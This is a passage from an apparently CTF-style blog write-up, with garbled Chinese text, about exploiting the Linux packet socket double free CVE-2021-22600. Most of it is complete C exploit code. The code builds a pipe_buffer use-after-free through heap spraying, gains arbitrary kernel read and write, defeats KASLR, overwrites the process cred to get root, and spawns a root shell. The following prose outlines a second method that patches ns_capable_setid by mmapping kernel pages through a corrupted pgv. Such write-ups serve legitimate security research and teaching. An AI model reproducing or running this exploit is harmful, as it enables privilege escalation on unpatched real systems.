i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing sk_buff and do the half-spraying...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (init_socket_array(sk_sockets1)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to initialize socket group 1!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (init_socket_array(sk_sockets2)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to initialize socket group 2!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_sockets1, buf, SKBUFF_DATA_SZ)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED spray group-1 sk_buff!&quot;</span>);<br>    &#125;<br><br>    send_cmd_to_child(CMD_SET_VERSION_V3);<br><br>    send_cmd_to_child(CMD_ALLOC_RX_RING);<br><br>    send_cmd_to_child(CMD_FREE_RX_RING);<br><br>    log_info(<span class="hljs-string">&quot;[*] Clearing noisy pages allocated in pgv...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; TP_BLK_NR * <span class="hljs-number">2</span>; i++) &#123;<br>        *(<span class="hljs-type">size_t</span>*) &amp;(noise_pages[i * <span class="hljs-number">0x1000</span>]) = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying another half of sk_buff to get pgv...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_sockets2, buf, SKBUFF_DATA_SZ)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED spray group-2 sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    log_info(<span class="hljs-string">&quot;[*] Free all sk_buff to fill partial lists and back to buddy...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (free_sk_buff(sk_sockets1, buf, SKBUFF_DATA_SZ)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED free group-1 sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (free_sk_buff(sk_sockets2, buf, SKBUFF_DATA_SZ)) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED free group-2 sk_buff!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying half of pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, PIPE_FCNTL_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Failed to do fcntl on pipe&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to expand %d pipe_buffer\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* reclam original pipe_buffer */</span><br>        <span class="hljs-keyword">if</span> (write_msg(msg_queue[i % MSG_QUEUE_NR], buf, PIPE_RECLAIM_SZ, <span class="hljs-number">0x3361626e74747261</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to reclaim pipe_buffer back!&quot;</span>);<br>        &#125;<br><br>        garbage_msgs[i % MSG_QUEUE_NR]++;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Triggerring double free and spraying half of pipe_buffer...&quot;</span>);<br><br>    send_cmd_to_child(CMD_SET_VERSION_V2);<br>    send_cmd_to_child(CMD_FREE_RX_RING);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR / <span class="hljs-number">2</span>); i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, PIPE_FCNTL_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Failed to do fcntl on pipe&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to expand %d pipe_buffer\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (write_msg(<br>            msg_queue[i % MSG_QUEUE_NR],<br>            buf,<br>            PIPE_RECLAIM_SZ,<br>            <span class="hljs-number">0x3361626e74747261</span><br>        ) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to reclaim pipe_buffer back!&quot;</span>);<br>        &#125;<br><br>        garbage_msgs[i % MSG_QUEUE_NR]++;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>            <span class="hljs-type">int</span> nr;<br><br>            <span class="hljs-comment">/* at this time, cpu slab is victim pipe_buffer, so no more spray */</span><br>            read(pipe_fd[j][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>            <span class="hljs-keyword">if</span> (nr != j &amp;&amp; nr == i) &#123;<br>                orig_idx = nr;<br>                victim_idx = j;<br>                <span class="hljs-keyword">goto</span> out_pipe;<br>            &#125;<br>            write(pipe_fd[j][<span class="hljs-number">1</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        &#125;<br>    &#125;<br><br>out_pipe:<br>    <span class="hljs-keyword">if</span> (orig_idx &lt; <span class="hljs-number">0</span> || victim_idx &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to construct UAF on pipe!&quot;</span>);<br>    &#125;<br><br>    log_success(<span class="hljs-string">&quot;[+] Successfully made UAF on pipe_buffer!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Original: %d, victim: %d\n&quot;</span>, orig_idx, victim_idx);<br><br>    close(pipe_fd[orig_idx][<span class="hljs-number">1</span>]);<br>    close(pipe_fd[orig_idx][<span class="hljs-number">0</span>]);<br><br>    log_info(<span class="hljs-string">&quot;[*] Crafting pipe_buffer overlapped with msg_msgseg...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (pipe(uaf_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate new pipe for UAF!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* move to pipe_buffer[1] */</span><br>    write(uaf_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(uaf_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">8</span>);<br>    write(uaf_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    close(pipe_fd[victim_idx][<span class="hljs-number">1</span>]);<br>    close(pipe_fd[victim_idx][<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">if</span> (write_msg(msg_queue[ATK_QUEUE_IDX], buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create msg_msg with msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * at this time the pipe was thought to be empty at buf[1],</span><br><span class="hljs-comment">     * so then the new page will ge granded on the buf[2]</span><br><span class="hljs-comment">    */</span><br>    write(uaf_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (read_msg(msg_queue[ATK_QUEUE_IDX], buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = 0; i &lt; MSG_EVIL_SZ / 8; i++) &#123;</span><br><span class="hljs-comment">        printf(&quot;[----data-dump----][%d] %lx\n&quot;, i, buf[i]);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    leak_pipe_buf = (<span class="hljs-type">void</span>*) &amp;buf[<span class="hljs-number">516</span>];<br><br>    <span class="hljs-built_in">printf</span>(<br>        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Leak pipe_buffer::page &quot;</span>) <span class="hljs-string">&quot;%p&quot;</span><br>        SUCCESS_MSG(<span class="hljs-string">&quot;, pipe_buffer::ops &quot;</span>) <span class="hljs-string">&quot;%p\n&quot;</span>,<br>        leak_pipe_buf-&gt;page,<br>        leak_pipe_buf-&gt;ops<br>    );<br><br>    pipe_ops = (<span class="hljs-type">void</span>*) leak_pipe_buf-&gt;ops;<br><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) leak_pipe_buf-&gt;page &amp; KASLR_MASK;<br>    log_info(<span class="hljs-string">&quot;[*] Try to guess vmemmap_base...&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Starts from %lx...\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-keyword">if</span> (write_msg(msg_queue[ATK_QUEUE_IDX], buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create msg_msg with msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    arbitrary_read_by_pipe(vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>, buf);<br><br>    kernel_leak = buf[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = 0; i &lt; 0xff0 / 8; i++) &#123;</span><br><span class="hljs-comment">        printf(&quot;[----data-dump----][%d] %lx\n&quot;, i, buf[i]);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> loop_nr = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; loop_nr++) &#123;<br>        <span class="hljs-keyword">if</span> (kernel_leak &gt; <span class="hljs-number">0xffffffff81000000</span><br>            &amp;&amp; (kernel_leak &amp; <span class="hljs-number">0xff</span>) &lt; <span class="hljs-number">0x100</span>) &#123;<br>            kernel_base = kernel_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>            <span class="hljs-keyword">if</span> (loop_nr != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<br>                INFO_MSG(<span class="hljs-string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,kernel_leak<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, kernel_base);<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, vmemmap_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80</span>; i++) &#123;<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\b&#x27;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;[No.%d loop] Got unmatched data: %lx, keep looping...&quot;</span>,<br>            loop_nr,<br>            kernel_leak<br>        );<br><br>        vmemmap_base -= KASLR_GRANULARITY;<br>        arbitrary_read_by_pipe(<br>            vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>,<br>            buf<br>        );<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Seeking task_struct in kernel space...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br>    uid = getuid();<br>    gid = getgid();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xff0</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] == comm_addr[<span class="hljs-number">-3</span>])) &#123;  <span class="hljs-comment">/* should be equal */</span><br><br>            <span class="hljs-built_in">printf</span>(<br>                SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                (vmemmap_base + i * <span class="hljs-number">0x40</span>)<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got cred address: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,comm_addr[<span class="hljs-number">-2</span>]);<br><br>            cred_kaddr = comm_addr[<span class="hljs-number">-2</span>];<br>            cred_data = (<span class="hljs-type">void</span>*) (cred_data_buf + (cred_kaddr &amp; (<span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>)));<br>            page_offset_base = cred_kaddr &amp; KASLR_MASK;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                cred_kpage_addr = vmemmap_base + \<br>                                (cred_kaddr - page_offset_base) / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>;<br>            <br>                arbitrary_read_by_pipe(<br>                    cred_kpage_addr,<br>                    cred_data_buf<br>                );<br>                <span class="hljs-keyword">if</span> (cred_data-&gt;uid == uid<br>                    &amp;&amp; cred_data-&gt;gid == gid) &#123;<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got page_offset_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        page_offset_base<br>                    );<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found cred on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        cred_kpage_addr<br>                    );<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                page_offset_base -= KASLR_GRANULARITY;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?] Looping!?&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);<br><br>    cred_data-&gt;uid = <span class="hljs-number">0</span>;<br>    cred_data-&gt;gid = <span class="hljs-number">0</span>;<br><br>    arbitrary_write_by_pipe(<br>        cred_kpage_addr,<br>        cred_data_buf,<br>        <span class="hljs-number">0xff0</span><br>    );<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    exploitation();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼Œä¸ä¾èµ–å…·ä½“å†…æ ¸é•œåƒçš„ data-only æ”»å‡»åªèƒ½è¯´æ˜¯éå¸¸èˆ’æœäº†ï¼Œä¸è¿‡æœ‰å°æ¦‚ç‡ä¼šæ²¡æ³•å®Œæˆ cross cache è€Œåˆ©ç”¨å¤±è´¥ï¼š</p><p><img src="https://s2.loli.net/2025/05/05/QzFXeg3dRBsuHc4.png"></p><h2 id="Exploitï¼šUser-Space-Mapping-Attack"><a href="#Exploitï¼šUser-Space-Mapping-Attack" class="headerlink" title="Exploitï¼šUser Space Mapping Attack"></a>Exploitï¼šUser Space Mapping Attack</h2><p>è¿™æ˜¯ 360 æ¼æ´å®‰å…¨ç ”ç©¶é™¢çš„ Alpha Lab åœ¨ BlackHat ä¸Šç»™å‡ºçš„ä¸€ç§æœ‰ç‚¹æ„æ€çš„è§£æ³•ï¼Œç¬”è€…åœ¨ <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">d3kcache</a> ç»™å‡ºçš„ç¬¬ä¸‰ç§åˆ©ç”¨æ–¹æ³•ä¸­ä½¿ç”¨äº†è¿™ç§æŠ€æœ¯çš„æœ¬è´¨ï¼Œè¿™é‡Œæ¥è®²ä¸€è®²è¿™ç§è§£æ³•çš„æºå¤´â€”â€”ä¹Ÿå°±æ˜¯  Alpha Lab ç»™ CVE-2021-22600 è¿™ä¸ªæ¼æ´çš„é¢„æœŸè§£æ³•</p><p>ä¸»è¦æ˜¯åˆ©ç”¨äº† <code>pgv</code> ç»“æ„ä½“æœ¬èº«çš„ç‰¹æ€§ï¼š</p><ul><li>æ—¢ç„¶ packet socket ç»™æˆ‘ä»¬æä¾›äº† mmap æ˜ å°„ <code>pgv</code> ä¸­é¡µé¢çš„æƒèƒ½ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF æ¼æ´åˆ©ç”¨å…¶ä»–ç»“æ„ä½“æ¥æ”¹å†™ <code>pgv</code> ä¸ºå†…æ ¸ä¸­çš„å…¶ä»–é¡µé¢ï¼Œå†é€šè¿‡ mmap æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä»è€Œç›´æ¥å®Œæˆå¯¹å†…æ ¸æ•°æ®çš„æ”¹å†™</li><li>packet socket çš„é¡µé¢æ˜ å°„ä¸­å­˜åœ¨å¯¹é¡µé¢ç±»å‹çš„æ£€æŸ¥ï¼Œä½†æ˜¯å†…æ ¸é•œåƒéƒ¨åˆ†å¯ä»¥å®Œç¾é€šè¿‡æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹å†™å†…æ ¸ä»£ç æ®µå®Œæˆæ¶æ„ä»£ç æ‰§è¡Œï¼Œæ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ˜¯ä¿®æ”¹ <code>ns_capable_setid</code> è¿™ä¸ªåœ¨ <code>setresuid()</code> ä¸­è¿›è¡Œæƒé™æ£€æŸ¥çš„å‡½æ•°ä½¿å…¶æ°¸è¿œè¿”å›æ£€æŸ¥é€šè¿‡ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥ä¿®æ”¹è‡ªèº« uid gid</li><li>å¯¹äºå†…æ ¸åœ°å€çš„æ³„æ¼è¿˜æ˜¯è€åŠæ³•ï¼šå…ˆè¯»å‡ºå †ä¸Šåœ°å€ï¼Œç„¶åæ ¹æ® KASLR çš„ç²’åº¦å»çŒœ <code>page_offset_base</code> ï¼Œå¦‚æœåœ¨ <code>page_offset_base + 0x9d000</code> æ‰¾åˆ°ä¸€ä¸ªæŒ‡å‘ <code>secondary_startup_64</code> çš„æŒ‡é’ˆé‚£å†…æ ¸ä»£ç æ®µåŸºåœ°å€å°±æœ‰äº†ï¼Œä¹‹åæŠŠ <code>pgv[0]</code> æ”¹æˆ <code>ns_capable_setid</code> å mmap ä¿®æ”¹å³å¯</li></ul><p>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ <strong>æˆ‘ä»¬ä¸èƒ½åœ¨ pgv ä¸­é•¿æœŸæŒæœ‰æŒ‡å‘å†…æ ¸ä»£ç æ®µçš„æŒ‡é’ˆ</strong> ï¼ˆå› ä¸ºä¼šæœ‰ä¸ª <del>éå¸¸sbçš„</del> å®šæ—¶å™¨åšæ£€æŸ¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ mmap ä¿®æ”¹å®Œä¹‹åé©¬ä¸Š munmap å†ç”¨ <code>sk_buff</code> æŠŠ <code>pgv[0]</code> ä¿®æ”¹å›åŸå€¼ï¼Œå¦åˆ™ä¼šå› ä¸ºå®šæ—¶å™¨å°è¯•è¯»å†™ <code>pgv[0]</code> æŒ‡å‘çš„ kernel ä»£ç æ®µè€Œå¯¼è‡´ kernel crashï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span 